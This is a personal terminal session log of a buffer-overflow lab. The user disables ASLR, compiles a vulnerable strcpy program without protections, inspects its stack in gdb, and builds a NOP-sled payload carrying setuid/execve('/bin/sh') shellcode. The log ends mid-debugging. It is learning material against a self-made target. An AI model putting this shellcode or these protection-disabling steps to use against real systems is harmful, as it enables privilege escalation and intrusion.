@@ -1,0 +1,900 @@
+chandan@chandan-desktop:~$ cd Desktop
+chandan@chandan-desktop:~/Desktop$ ls
+ 344166997_917498539327672_310192589445035475_n.jpg
+ admitc.pdf
+ a.out
+ back
+ CUBOTHON
+'Cubothon Windows'
+ heelo.c
+ India.docx
+ Packet_sniffer_C
+ projects
+ ptrace_imp.c
+ Ribhu
+ Rishi
+ Rusty-Calculator
+'School Work'
+ SheldonRoss_Probability.pdf
+ sublime_text.desktop
+ Sukalyan
+ TLauncher-2.86.jar
+ Whatsapp.desktop
+ wps-office-prometheus.desktop
+chandan@chandan-desktop:~/Desktop$ cd projects
+chandan@chandan-desktop:~/Desktop/projects$ ls
+a.out               fileless  packet_analyzer.c   rust               udpdos.py
+dos.py              mem.c     program_output.log  sel_test.py
+FB_OpenRedirect.py  pac       requirements.txt    strace_output.log
+chandan@chandan-desktop:~/Desktop/projects$ mkdir buf_overflow
+chandan@chandan-desktop:~/Desktop/projects$ ls
+a.out               fileless           program_output.log  strace_output.log
+buf_overflow        mem.c              requirements.txt    udpdos.py
+dos.py              pac                rust
+FB_OpenRedirect.py  packet_analyzer.c  sel_test.py
+chandan@chandan-desktop:~/Desktop/projects$ cd 
+buf_overflow/ fileless/     rust/         
+chandan@chandan-desktop:~/Desktop/projects$ cd 
+chandan@chandan-desktop:~$ cd 
+.android/          dotnet/            .kde/              .plastic4/
+Arduino/           Downloads/         .linuxmint/        Public/
+.arduino15/        .eclipse/          .local/            .putty/
+.armagetronad/     eclipse/           logs/              .rednotebook/
+.avidemux6/        Eclipse Projects / .mcreator/         .rpmdb/
+.bluefish/         .emacs.d/          .minecraft/        .rustup/
+.bluej/            emSigner/          .mono/             .ssh/
+.bluej.Boot$App/   .eric6/            .mozilla/          .swt/
+.byobu/            .fadein/           .mplayer/          Templates/
+.cache/            .gconf/            Music/             .thunderbird/
+Calibre Library/   .gnome/            .mysql/            .tlauncher/
+.cargo/            .gnupg/            My Web Sites/      Unity/
+.cinnamon/         .gphoto/           .netbeans/         .var/
+.config/           GPUCache/          .omnidb/           Videos/
+.dbus/             .gradle/           .openjfx/          .vscode/
+.dbvis/            .idlerc/           .openshot_qt/      .wine/
+Desktop/           .java/             .p2/               .zenmap/
+Documents/         .jdks/             Pictures/          .zoom/
+.dotnet/           .jssc/             .pki/              
+chandan@chandan-desktop:~$ cd Desktop
+chandan@chandan-desktop:~/Desktop$ cd projects
+chandan@chandan-desktop:~/Desktop/projects$ ls
+a.out               fileless           program_output.log  strace_output.log
+buf_overflow        mem.c              requirements.txt    udpdos.py
+dos.py              pac                rust
+FB_OpenRedirect.py  packet_analyzer.c  sel_test.py
+chandan@chandan-desktop:~/Desktop/projects$ cd buf_overflow
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ls
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+
+       \^V//
+       |. .|    I AM (G)ROOT!
+     - \ - / _
+      \_| |_/
+        \ \
+      __/_/__
+     |_______|   With great power comes great responsibility.
+      \     /    Use sudo wisely.
+       \___/    
+
+[sudo] password for chandan:               
+Sorry, try again.
+[sudo] password for chandan:                
+0
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$  gcc -fno-stack-protector -z execstack program.c -o program
+gcc: error: program.c: No such file or directory
+gcc: fatal error: no input files
+compilation terminated.
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gcc -fno-stack-protector -z execstack program.c -o program
+gcc: error: program.c: No such file or directory
+gcc: fatal error: no input files
+compilation terminated.
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ nano esp.c
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gcc -o esp esp.c
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./esp
+$esp = 0xffffde30
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./esp
+$esp = 0xffffde30
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./esp
+$esp = 0xffffde30
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ echo 1 > /proc/sys/kernel/randomize_va_space
+bash: /proc/sys/kernel/randomize_va_space: Permission denied
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ echo 1 >sudo /proc/sys/kernel/randomize_va_space
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./esp
+$esp = 0xffffde30
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./esp
+$esp = 0xffffde30
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ls
+esp  esp.c  sudo
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+
+       \^V//
+       |. .|    I AM (G)ROOT!
+     - \ - / _
+      \_| |_/
+        \ \
+      __/_/__
+     |_______|   With great power comes great responsibility.
+      \     /    Use sudo wisely.
+       \___/    
+
+[sudo] password for chandan: 
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ echo 1 | sudo tee /proc/sys/kernel/randomize_va_space
+
+       \^V//
+       |. .|    I AM (G)ROOT!
+     - \ - / _
+      \_| |_/
+        \ \
+      __/_/__
+     |_______|   With great power comes great responsibility.
+      \     /    Use sudo wisely.
+       \___/    
+
+[sudo] password for chandan:                
+1
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./esp
+$esp = 0xeeabf580
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./esp
+$esp = 0xcd501280
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./esp
+$esp = 0x1855b9f0
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ echo 1 | sudo tee /proc/sys/kernel/randomize_va_space
+
+       \^V//
+       |. .|    I AM (G)ROOT!
+     - \ - / _
+      \_| |_/
+        \ \
+      __/_/__
+     |_______|   With great power comes great responsibility.
+      \     /    Use sudo wisely.
+       \___/    
+
+[sudo] password for chandan:                
+1
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./esp
+$esp = 0x09177090
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./esp
+$esp = 0xbc310a30
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+
+       \^V//
+       |. .|    I AM (G)ROOT!
+     - \ - / _
+      \_| |_/
+        \ \
+      __/_/__
+     |_______|   With great power comes great responsibility.
+      \     /    Use sudo wisely.
+       \___/    
+
+[sudo] password for chandan:                
+0
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./esp
+$esp = 0xffffde30
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./esp
+$esp = 0xffffde30
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ nano bo1.c
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gcc -g -z execstack -no-pie -o bo1 bo1.c
+bo1.c: In function ‘main’:
+bo1.c:4:2: warning: implicit declaration of function ‘copier’ [-Wimplicit-function-declaration]
+    4 |  copier(argv[1]);
+      |  ^~~~~~
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ nano bo1.c
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gcc -g -z execstack -no-pie -o bo1 bo1.c
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./bo1 A
+Done!
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ nano b1
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ chmod a+x b1
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./b1
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./b1 > e1
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ls -l e1
+-rw-rw-r-- 1 chandan chandan 117 Jun  6 03:03 e1
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./bo1 $(cat e1)
+*** stack smashing detected ***: terminated
+Aborted (core dumped)
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ls
+b1  bo1  bo1.c  e1  esp  esp.c  sudo
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gcc -fno-stack-protector -z execstack bo1.c -o bo1
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ls
+b1  bo1  bo1.c  e1  esp  esp.c  sudo
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./bo1 A
+Done!
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ chmod a+x b1
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./b1
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./b1 > e1
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ls -l e1
+-rw-rw-r-- 1 chandan chandan 117 Jun  6 03:09 e1
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./bo1 $(cat e1)
+Done!
+Segmentation fault (core dumped)
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gdb -q bo1
+Reading symbols from bo1...
+(No debugging symbols found in bo1)
+(gdb) list
+No symbol table is loaded.  Use the "file" command.
+(gdb) break 10
+No symbol table is loaded.  Use the "file" command.
+(gdb) exit
+Undefined command: "exit".  Try "help".
+(gdb) back
+No stack.
+(gdb) q
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gdb -q bo1
+Reading symbols from bo1...
+(No debugging symbols found in bo1)
+(gdb) gdb -q ./bo1
+Undefined command: "gdb".  Try "help".
+(gdb) q
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gdb -q ./bo1
+Reading symbols from ./bo1...
+(No debugging symbols found in ./bo1)
+(gdb) q
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gdb ./bo1
+GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./bo1...
+(No debugging symbols found in ./bo1)
+(gdb) q
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ cat bo1.c
+#include <string.h>
+#include <stdio.h>
+int copier(char *str) {
+	char buffer[100];
+	strcpy(buffer, str);
+}
+void main(int argc, char *argv[]) {
+	copier(argv[1]);
+	printf("Done!\n");
+}
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gcc -fno-stack-protector -z execstack program.c -o program
+gcc: error: program.c: No such file or directory
+gcc: fatal error: no input files
+compilation terminated.
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gcc -fno-stack-protector -z execstack bo1.c -o bo1
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ~/.gdbinit
+bash: /home/chandan/.gdbinit: No such file or directory
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gdb bo1
+GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from bo1...
+(No debugging symbols found in bo1)
+(gdb) dissas
+Undefined command: "dissas".  Try "help".
+(gdb) disass
+No frame selected.
+(gdb) disass main
+Dump of assembler code for function main:
+   0x000000000000118f <+0>:	endbr64 
+   0x0000000000001193 <+4>:	push   %rbp
+   0x0000000000001194 <+5>:	mov    %rsp,%rbp
+   0x0000000000001197 <+8>:	sub    $0x10,%rsp
+   0x000000000000119b <+12>:	mov    %edi,-0x4(%rbp)
+   0x000000000000119e <+15>:	mov    %rsi,-0x10(%rbp)
+   0x00000000000011a2 <+19>:	mov    -0x10(%rbp),%rax
+   0x00000000000011a6 <+23>:	add    $0x8,%rax
+   0x00000000000011aa <+27>:	mov    (%rax),%rax
+   0x00000000000011ad <+30>:	mov    %rax,%rdi
+   0x00000000000011b0 <+33>:	callq  0x1169 <copier>
+   0x00000000000011b5 <+38>:	lea    0xe48(%rip),%rdi        # 0x2004
+   0x00000000000011bc <+45>:	callq  0x1070 <puts@plt>
+   0x00000000000011c1 <+50>:	nop
+   0x00000000000011c2 <+51>:	leaveq 
+   0x00000000000011c3 <+52>:	retq   
+End of assembler dump.
+(gdb) run A
+Starting program: /home/chandan/Desktop/projects/buf_overflow/bo1 A
+Done!
+[Inferior 1 (process 2794203) exited with code 06]
+(gdb) q
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gdb -q ./bo1
+Reading symbols from ./bo1...
+(No debugging symbols found in ./bo1)
+(gdb) list
+No symbol table is loaded.  Use the "file" command.
+(gdb) list main
+No symbol table is loaded.  Use the "file" command.
+(gdb) q
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gdb bo1.c
+GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+"/home/chandan/Desktop/projects/buf_overflow/bo1.c": not in executable format: file format not recognized
+(gdb) list
+No symbol table is loaded.  Use the "file" command.
+(gdb) q
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gdb ./bo1
+GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./bo1...
+(No debugging symbols found in ./bo1)
+(gdb) list 
+No symbol table is loaded.  Use the "file" command.
+(gdb) file
+No executable file now.
+No symbol file now.
+(gdb) q
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gcc -g -fno-stack-protector -z execstack bo1.c -o bo1 
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./bo1 A
+Done!
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./bo1 $(cat e1)
+Done!
+Segmentation fault (core dumped)
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gdb -q bo1
+Reading symbols from bo1...
+(gdb) list
+1	#include <string.h>
+2	#include <stdio.h>
+3	int copier(char *str) {
+4		char buffer[100];
+5		strcpy(buffer, str);
+6	}
+7	void main(int argc, char *argv[]) {
+8		copier(argv[1]);
+9		printf("Done!\n");
+10	}
+(gdb) break 10
+Breakpoint 1 at 0x11c1: file bo1.c, line 10.
+(gdb) clear
+No source file specified.
+(gdb) clear bo1
+Function "bo1" not defined.
+(gdb) clear b
+Function "b" not defined.
+(gdb) q
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gdb -q bo1
+Reading symbols from bo1...
+(gdb) list
+1	#include <string.h>
+2	#include <stdio.h>
+3	int copier(char *str) {
+4		char buffer[100];
+5		strcpy(buffer, str);
+6	}
+7	void main(int argc, char *argv[]) {
+8		copier(argv[1]);
+9		printf("Done!\n");
+10	}
+(gdb) break 6
+Breakpoint 1 at 0x118c: file bo1.c, line 6.
+(gdb) run A
+Starting program: /home/chandan/Desktop/projects/buf_overflow/bo1 A
+
+Breakpoint 1, copier (str=0x7fffffffe21d "A") at bo1.c:6
+6	}
+(gdb) info registers
+rax            0x7fffffffdd20      140737488346400
+rbx            0x5555555551d0      93824992235984
+rcx            0x7ffff7e4ce70      140737352355440
+rdx            0x41                65
+rsi            0x7fffffffe21d      140737488347677
+rdi            0x7fffffffdd20      140737488346400
+rbp            0x7fffffffdd90      0x7fffffffdd90
+rsp            0x7fffffffdd10      0x7fffffffdd10
+r8             0x0                 0
+r9             0x7ffff7fe0d60      140737354009952
+r10            0x3                 3
+r11            0x7ffff7f45108      140737353371912
+r12            0x555555555080      93824992235648
+r13            0x7fffffffdea0      140737488346784
+r14            0x0                 0
+r15            0x0                 0
+rip            0x55555555518c      0x55555555518c <copier+35>
+eflags         0x202               [ IF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+gs             0x0                 0
+(gdb) x/40x $esp
+0xffffffffffffdd10:	Cannot access memory at address 0xffffffffffffdd10
+(gdb) x/40x $rsp
+0x7fffffffdd10:	0x00000000	0x00000000	0xffffe21d	0x00007fff
+0x7fffffffdd20:	0x00000041	0x00000000	0x00000000	0x00000000
+0x7fffffffdd30:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffdd40:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffdd50:	0x55554040	0x00005555	0x00f0b2ff	0x00000000
+0x7fffffffdd60:	0x000000c2	0x00000000	0xffffdd97	0x00007fff
+0x7fffffffdd70:	0xffffdd96	0x00007fff	0x5555521d	0x00005555
+0x7fffffffdd80:	0xf7f872e8	0x00007fff	0x555551d0	0x00005555
+0x7fffffffdd90:	0xffffddb0	0x00007fff	0x555551b5	0x00005555
+0x7fffffffdda0:	0xffffdea8	0x00007fff	0x00000000	0x00000002
+(gdb) run $(cat e1)
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/chandan/Desktop/projects/buf_overflow/bo1 $(cat e1)
+
+Breakpoint 1, copier (str=0x7fffffffe1aa 'A' <repeats 116 times>) at bo1.c:6
+6	}
+(gdb) info registers
+rax            0x7fffffffdcb0      140737488346288
+rbx            0x5555555551d0      93824992235984
+rcx            0x4141414141414141  4702111234474983745
+rdx            0x41414141414141    18367622009667905
+rsi            0x7fffffffe210      140737488347664
+rdi            0x7fffffffdd16      140737488346390
+rbp            0x7fffffffdd20      0x7fffffffdd20
+rsp            0x7fffffffdca0      0x7fffffffdca0
+r8             0x0                 0
+r9             0x7ffff7fe0d60      140737354009952
+r10            0x3                 3
+r11            0x7ffff7f45108      140737353371912
+r12            0x555555555080      93824992235648
+r13            0x7fffffffde30      140737488346672
+r14            0x0                 0
+r15            0x0                 0
+rip            0x55555555518c      0x55555555518c <copier+35>
+eflags         0x202               [ IF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+gs             0x0                 0
+(gdb) x/40x $rsp
+0x7fffffffdca0:	0x00000000	0x00000000	0xffffe1aa	0x00007fff
+0x7fffffffdcb0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdcc0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdcd0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdce0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdcf0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdd00:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdd10:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdd20:	0x41414141	0x00007f00	0x555551b5	0x00005555
+0x7fffffffdd30:	0xffffde38	0x00007fff	0x00000000	0x00000002
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 2794442] will be killed.
+
+Quit anyway? (y or n) y
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ apt update
+
+       \^V//
+       |. .|    I AM (G)ROOT!
+     - \ - / _
+      \_| |_/
+        \ \
+      __/_/__
+     |_______|   With great power comes great responsibility.
+      \     /    Use sudo wisely.
+       \___/    
+
+[sudo] password for chandan:                
+Hit:1 https://brave-browser-apt-release.s3.brave.com stable InRelease
+Hit:2 http://packages.microsoft.com/repos/code stable InRelease
+Hit:3 http://repo.mysql.com/apt/debian jessie InRelease                           
+Ign:4 http://packages.linuxmint.com ulyana InRelease                              
+Hit:5 http://security.ubuntu.com/ubuntu focal-security InRelease                  
+Err:3 http://repo.mysql.com/apt/debian jessie InRelease                   
+  The following signatures were invalid: EXPKEYSIG 8C718D3B5072E1F5 MySQL Release Engineering <mysql-build@oss.oracle.com>
+Hit:6 http://archive.ubuntu.com/ubuntu focal InRelease
+Hit:7 http://packages.linuxmint.com ulyana Release
+Hit:8 http://archive.ubuntu.com/ubuntu focal-updates InRelease
+Hit:10 http://dl.google.com/linux/chrome/deb stable InRelease                     
+Hit:11 http://archive.ubuntu.com/ubuntu focal-backports InRelease                 
+Get:12 https://dl.winehq.org/wine-builds/ubuntu kinetic InRelease [6,265 B]       
+Hit:13 http://archive.canonical.com/ubuntu focal InRelease                        
+Err:12 https://dl.winehq.org/wine-builds/ubuntu kinetic InRelease                 
+  The following signatures couldn't be verified because the public key is not available: NO_PUBKEY 76F1A20FF987672F
+Hit:14 http://ppa.launchpad.net/obsproject/obs-studio/ubuntu focal InRelease
+Get:15 http://repository.spotify.com stable InRelease [3,316 B]
+Err:15 http://repository.spotify.com stable InRelease
+  The following signatures couldn't be verified because the public key is not available: NO_PUBKEY 7A3A762FAFD4A51F
+Reading package lists... Done
+W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://repo.mysql.com/apt/debian jessie InRelease: The following signatures were invalid: EXPKEYSIG 8C718D3B5072E1F5 MySQL Release Engineering <mysql-build@oss.oracle.com>
+W: GPG error: https://dl.winehq.org/wine-builds/ubuntu kinetic InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY 76F1A20FF987672F
+E: The repository 'https://dl.winehq.org/wine-builds/ubuntu kinetic InRelease' is not signed.
+N: Updating from such a repository can't be done securely, and is therefore disabled by default.
+N: See apt-secure(8) manpage for repository creation and user configuration details.
+W: GPG error: http://repository.spotify.com stable InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY 7A3A762FAFD4A51F
+E: The repository 'http://repository.spotify.com stable InRelease' is not signed.
+N: Updating from such a repository can't be done securely, and is therefore disabled by default.
+N: See apt-secure(8) manpage for repository creation and user configuration details.
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ apt install hexedit -y
+
+       \^V//
+       |. .|    I AM (G)ROOT!
+     - \ - / _
+      \_| |_/
+        \ \
+      __/_/__
+     |_______|   With great power comes great responsibility.
+      \     /    Use sudo wisely.
+       \___/    
+
+[sudo] password for chandan:                
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+The following NEW packages will be installed:
+  hexedit
+0 upgraded, 1 newly installed, 0 to remove and 28 not upgraded.
+Need to get 24.6 kB of archives.
+After this operation, 68.6 kB of additional disk space will be used.
+Get:1 http://archive.ubuntu.com/ubuntu focal/universe amd64 hexedit amd64 1.4.2-6 [24.6 kB]
+Fetched 24.6 kB in 1s (28.1 kB/s)
+Selecting previously unselected package hexedit.
+(Reading database ... 887536 files and directories currently installed.)
+Preparing to unpack .../hexedit_1.4.2-6_amd64.deb ...
+Unpacking hexedit (1.4.2-6) ...
+Setting up hexedit (1.4.2-6) ...
+Processing triggers for man-db (2.9.1-1) ...
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ cp e1 e2
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ hexedit e2
+
+[1]+  Stopped                 hexedit e2
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ hexedit e2
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ hexedit e2
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gdb -q bo1
+Reading symbols from bo1...
+(gdb) list
+1	#include <string.h>
+2	#include <stdio.h>
+3	int copier(char *str) {
+4		char buffer[100];
+5		strcpy(buffer, str);
+6	}
+7	void main(int argc, char *argv[]) {
+8		copier(argv[1]);
+9		printf("Done!\n");
+10	}
+(gdb) break 6
+Breakpoint 1 at 0x118c: file bo1.c, line 6.
+(gdb) run $(cat e2)
+Starting program: /home/chandan/Desktop/projects/buf_overflow/bo1 $(cat e2)
+
+Breakpoint 1, copier (str=0x7fffffffe1aa 'A' <repeats 112 times>, "1234")
+    at bo1.c:6
+6	}
+(gdb) x/40x $rsp
+0x7fffffffdca0:	0x00000000	0x00000000	0xffffe1aa	0x00007fff
+0x7fffffffdcb0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdcc0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdcd0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdce0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdcf0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdd00:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdd10:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdd20:	0x34333231	0x00007f00	0x555551b5	0x00005555
+0x7fffffffdd30:	0xffffde38	0x00007fff	0x00000000	0x00000002
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 2796053] will be killed.
+
+Quit anyway? (y or n) y
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ \x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89
+bash: x31xc0x89xc3xb0x17xcdx80x31xd2x52x68x6ex2fx73x68x68x2fx2fx62x69x89: command not found
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ 
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ nano b3
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ chmod a+x b3
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./b3 > e3
+./b3: line 1: !/usr/bin/python: No such file or directory
+./b3: line 3: nopsled: command not found
+./b3: line 4: syntax error near unexpected token `('
+./b3: line 4: `shellcode = ('
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ nano b3
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./b3 > e3
+./b3: line 1: !/usr/bin/python: No such file or directory
+./b3: line 3: nopsled: command not found
+./b3: line 4: syntax error near unexpected token `('
+./b3: line 4: `shellcode = ('\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2' +'\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +'\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80')'
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ nano b3
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ ./b3 > e3
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ hexedit e3
+chandan@chandan-desktop:~/Desktop/projects/buf_overflow$ gdb bo1
+GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from bo1...
+(gdb) list
+1	#include <string.h>
+2	#include <stdio.h>
+3	int copier(char *str) {
+4		char buffer[100];
+5		strcpy(buffer, str);
+6	}
+7	void main(int argc, char *argv[]) {
+8		copier(argv[1]);
+9		printf("Done!\n");
+10	}
+(gdb) break 6
+Breakpoint 1 at 0x118c: file bo1.c, line 6.
+(gdb) run $(cat e3)
+Starting program: /home/chandan/Desktop/projects/buf_overflow/bo1 $(cat e3)
+
+Breakpoint 1, copier (
+    str=0x7fffffffe1aa '\220' <repeats 64 times>, "\061\300\211ð\027̀1\322Rhn/shh//bi\211\343RS\211\341\215B\v̀", 'A' <repeats 16 times>, "1234") at bo1.c:6
+6	}
+(gdb) info registers
+rax            0x7fffffffdcb0      140737488346288
+rbx            0x5555555551d0      93824992235984
